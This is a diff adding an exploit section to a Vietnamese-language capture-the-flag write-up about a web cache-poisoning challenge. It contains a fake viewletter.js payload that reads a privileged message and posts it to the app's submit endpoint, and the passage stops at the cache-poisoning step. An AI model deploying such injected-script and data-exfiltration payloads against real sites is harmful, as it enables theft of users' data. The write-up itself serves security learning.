@@ -171,4 +171,32 @@ Nội dung file config cho thấy ứng dụng sẽ thực hiện cache theo cá
 
 ### Điều kiện cần số 3 => Cần phải thực hiện Cache Poisoning để đánh lừa ứng dụng gọi đến file  `viewletter.js` fake.
 
+***
+## Exploit
+
+Kết hợp các thông tin từ 3 điều kiện cần ở trên, ta tiến hành chuẩn bị các bước để Exploit Challenge như sau:
+
+1. Dựng 1 web server để chứa file **viewletter.js** fake, nội dung của file fake như sau:
+
+```javascript
+fetch("http://127.0.0.1:80/message/3").then((r) => {
+    return r.text();
+}).then((x) => {
+    fetch("http://127.0.0.1:80/submit", {
+        "headers": {
+            "content-type": "application/json"
+        },
+        "body": x,
+        "method": "POST",
+        "mode": "cors",
+        "credentials": "omit"
+    });
+});
+```
+
+Thử truy cập đến link file trên để chắc chắn rằng ứng dụng có thể gọi đến file fake này:
+
+![image](https://github.com/nguyenkhai98/writeup/assets/51147179/415f98f5-be6a-4ad8-b65c-4426ec36de6f)
+
+2. Thực hiện Cache Poisoning
 
